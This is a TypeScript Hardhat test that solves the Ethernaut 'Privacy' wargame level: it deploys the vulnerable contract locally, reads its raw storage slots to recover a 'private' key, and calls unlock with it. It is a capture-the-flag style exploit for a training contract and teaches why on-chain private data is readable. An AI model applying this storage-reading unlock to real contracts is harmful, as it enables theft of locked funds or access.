import { ethers } from "hardhat";
import { expect } from "chai";
import { dataSlice } from "ethers";

describe("Ethernaut Level 12 - Privacy", function () {
  it("Should unlock the contract by reading private data", async function () {
    const [player] = await ethers.getSigners();

    const dummyData = [
      ethers.encodeBytes32String("alpha"),       // data[0]
      ethers.encodeBytes32String("beta"),        // data[1]
      ethers.encodeBytes32String("supersecret"), // data[2] (key)
    ];

    const Privacy = await ethers.getContractFactory("Privacy");
    const contract = await Privacy.deploy(dummyData);
    await contract.waitForDeployment();

    expect(await contract.locked()).to.be.true;

    const slots = [3, 4, 5]; //Correct slots for the array

    let key: string | null = null;

    for (const slot of slots) {
      const val = await ethers.provider.getStorage(contract.target as string, slot);
      console.log(`Slot ${slot}:`, val);

      const expected = ethers.encodeBytes32String("supersecret");
      if (val.startsWith(expected.slice(0, 10))) {
        key = dataSlice(val, 0, 16);
        console.log(`✅ Found key in slot ${slot}:`, key);
        break;
      }
    }

    if (!key) {
      throw new Error("❌ Key not found in any slot!");
    }

    const tx = await contract.connect(player).unlock(key);
    await tx.wait();

    expect(await contract.locked()).to.be.false;
    console.log("Contract successfully unlocked!");
  });
});
